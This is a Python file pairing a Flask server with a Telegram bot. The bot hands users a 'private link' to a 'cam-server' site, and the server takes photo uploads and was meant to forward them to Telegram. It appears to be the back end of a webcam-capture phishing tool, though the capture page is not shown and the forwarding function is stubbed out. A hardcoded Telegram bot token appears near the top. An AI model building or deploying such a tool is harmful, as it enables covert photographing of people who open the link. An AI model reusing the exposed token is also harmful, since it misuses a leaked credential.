from flask import Flask, render_template, request
import telebot
import threading
import os

# ==========================
# Bot setup
# ==========================
BOT_TOKEN = "8257336150:AAGjrGA6AQERkWuKG0hTVAjs_7oTqMzXw14"
bot = telebot.TeleBot(BOT_TOKEN)

# Replace with your Render project link
PROJECT_LINK = "https://cam-server-project.onrender.com"

app = Flask(__name__)

# ==========================
# Flask routes
# ==========================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    if 'photo' in request.files:
        photo = request.files['photo']

        # Save temporarily
        temp_path = f"temp_{threading.get_ident()}.jpg"
        photo.save(temp_path)

        # Send to Telegram in background
        threading.Thread(target=send_photo, args=(temp_path,)).start()

    return "OK"

def send_photo(path):
    try:
        # Here you can send to a fixed admin ID too if needed
        # bot.send_photo(ADMIN_CHAT_ID, img)

        # Optional: skip since we only send to user directly
        pass
    finally:
        try:
            os.remove(path)
        except:
            pass

# ==========================
# Telegram bot handlers
# ==========================
@bot.message_handler(commands=['start'])
def start(message):
    username = message.from_user.first_name
    chat_id = message.chat.id

    text = f"👋 Hello {username}!\n\nThis is your private link:\n{PROJECT_LINK}\n\n📌 Your chat ID: `{chat_id}`"
    bot.send_message(chat_id, text, parse_mode="Markdown")

# ==========================
# Run both Flask + Bot
# ==========================
def run_flask():
    app.run(host='0.0.0.0', port=10000)

def run_bot():
    bot.polling(non_stop=True)

if __name__ == "__main__":
    threading.Thread(target=run_flask).start()
    run_bot()
